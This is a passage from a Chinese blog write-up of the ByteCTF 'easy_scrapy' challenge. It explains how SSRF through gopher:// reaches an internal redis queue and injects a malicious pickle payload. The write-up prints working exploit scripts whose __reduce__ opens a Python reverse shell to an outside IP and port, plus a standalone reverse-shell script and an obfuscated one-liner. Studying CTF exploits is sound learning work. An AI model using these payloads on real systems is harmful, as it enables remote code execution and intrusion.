<span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"><span class="comment"># 使用dict转换item，然后插入数据库</span></span><br><span class="line">    quote_info = dict(item)</span><br><span class="line">    print(quote_info)</span><br><span class="line">    self.table.insert(quote_info)</span><br><span class="line">    <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>bytectf/<strong>init</strong>.py：空</li>
</ol>
<p>爬虫源码非常简单，全部文件读出来还会发现内网有一台 mongodb 其实为了防止大家跑偏这台 mongodb 特意加了密码，简单想一下就会发现并没有什么能利用的（原因：redis 机器的 ip 不是 localhost，所以拿到 shell 也没用），然后我们继续分析爬虫的源码（不是很能理解）。也就是其中的这段代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># byte.py 片段</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        <span class="comment"># 主键，原始 url</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>, url):</span><br><span class="line">                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list) &gt; <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到是用 scrapy_redis 写的一个爬虫，功能即接收url，抓取其中的 url 链接然后爬取。</p>
<h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>文件基本读取完成，整理一下已知信息：（分析数据流，然后分析数据流中间危险函数）</p>
<ol>
<li>web 应用将任务传给redis，redis做为 broker（dumps）</li>
<li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li>
</ol>
<p>题解的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># exp1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a target="_blank" rel="noopener" href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p>
<h2 id="拆解exp"><a href="#拆解exp" class="headerlink" title="拆解exp"></a>拆解exp</h2><p>exp 中知识盲区太多。可以考虑整理过后基础补充吧（Nnn 大佬还提供一种思路——打 redis），整理后的 exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># exp2.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            python -c  &#x27;import socket,subprocess,os;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">                        p=subprocess.call(</span></span><br><span class="line"><span class="string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span></span><br><span class="line"><span class="string">                                          );</span></span><br><span class="line"><span class="string">                        &#x27;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来就一点点分析这个 exp，然后自己尝试些 exp。</p>
<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p>
<p>在这里补了一下 Python 反弹 shell 的姿势。尝试使用自己的反弹 shell 脚本 反弹 shell。Python 反弹 shell 的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;120.55.50.65&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call(</span><br><span class="line">    [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在 <a target="_blank" rel="noopener" href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python -c &quot;(lambda __g: [[[[(s.connect((&#39;120.55.50.65&#39;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#39;p&#39;] in [(subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;, &#39;-i&#39;]))]][0])[1])[1])[1])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0])(globals())&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将替换原 exp 中的 反弹 shell 脚本，得到脚本：（注意引号问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>最后需要看懂 poc 的 前半部分，就是下面这一小块：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;172.20.0.7:6379&#x2F;_ZADD byte:requests 0 &quot;“</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在此之前先去补充了一下 gopher 和 redis 的基本用法。并且题解中提到通过观察源码可以知道 scrapy_redis 它会将request对象存入爬虫名:requests这样的有序列表中。这里我有 2 个问题：</p>
<ol>
<li>使用 gopher 协议可以向 redis 插入数据？可以在本地进行测试。</li>
<li>为什么在 result= 之后可以 SSRF？怎么进行测试？<br>使用下面的 url 在本地进行测试，确实可以获取到数据。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 插入键和值</span><br><span class="line">curl -v gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_set%20runoobkey%20redis</span><br><span class="line"># 获取值</span><br><span class="line">curl -v gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_get%20runoobkey</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>通过前面读取源码，可以知道 host</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">127.0.0.1     localhost</span><br><span class="line">::1           localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0       ip6-localnet</span><br><span class="line">ff00::0       ip6-mcastprefix</span><br><span class="line">ff02::1       ip6-allnodes</span><br><span class="line">ff02::2       ip6-allrouters</span><br><span class="line">172.20.0.5    914c062c7588</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>整理一下所有 ip 的思路（只看后缀）</p>
<ol>
<li>setting.py 中有一个 .7 的 ip</li>
<li>pipelines.py 中有一个 .8 的 ip</li>
<li>host 中有 .5 的 ip<br>每个 ip 都对应一个 redis，参考这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> 可知，存在主从 redis。如何判断 主服务器的地址呢？为啥开始 exp 打 .7 的 ip 呢？</li>
</ol>
<p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p>
<hr>
<p>官方已经将环境关闭了，额，补不完了。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/10/17/20201017-N1CTF/" rel="prev" title="2020年10月N1CTF部分web题解">
      <i class="fa fa-chevron-left"></i> 2020年10月N1CTF部分web题解
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/10/31/20201031-PDFCreator%E9%A2%98%E8%A7%A3/" rel="next" title="PDFCreator题解">
      PDFCreator题解 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-scrapy"><span class="nav-number">1.</span> <span class="nav-text">easy_scrapy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">读取文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.</span> <span class="nav-text">Python反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%86%E8%A7%A3exp"><span class="nav-number">1.3.</span> <span class="nav-text">拆解exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.3.1.</span> <span class="nav-text">python反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.2.</span> <span class="nav-text">gopher协议</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">slug01sh</p>
  <div class="site-description" itemprop="description">欢迎大家发表自己的见解与评价</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">7</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">slug01sh</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
